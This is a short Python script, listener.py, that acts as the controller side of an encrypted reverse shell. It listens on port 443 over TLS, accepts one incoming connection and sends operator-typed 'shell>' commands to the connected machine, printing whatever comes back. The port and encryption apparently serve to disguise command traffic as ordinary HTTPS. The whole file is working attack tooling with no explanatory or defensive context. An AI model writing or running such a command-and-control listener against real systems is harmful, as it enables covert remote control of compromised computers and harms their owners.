#!/usr/bin/env python3

# listener.py
import socket
import ssl

LISTENER_IP = "0.0.0.0"  # Listen on all interfaces
LISTENER_PORT = 443      # HTTPS port

def start_listener():
    # Create a socket object
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Wrap the socket with SSL
    wrapped_socket = ssl.wrap_socket(sock, server_side=True, 
                                     certfile="server.crt", 
                                     keyfile="server.key")

    # Bind to the specified IP and port
    wrapped_socket.bind((LISTENER_IP, LISTENER_PORT))

    # Start listening
    wrapped_socket.listen(1)
    print(f"[+] Listening for connections on {LISTENER_PORT}...")

    # Accept the incoming connection
    client_socket, client_address = wrapped_socket.accept()
    print(f"[+] Connection established with {client_address}")

    while True:
        try:
            command = input("shell> ")

            if command.lower() == "exit":
                client_socket.send(b"exit")
                break

            # Send the command
            client_socket.send(command.encode())

            # Receive the response
            response = client_socket.recv(4096).decode()
            print(response)

        except Exception as e:
            print(f"[-] Error: {e}")
            break

    client_socket.close()
    wrapped_socket.close()
    print("[+] Listener stopped")

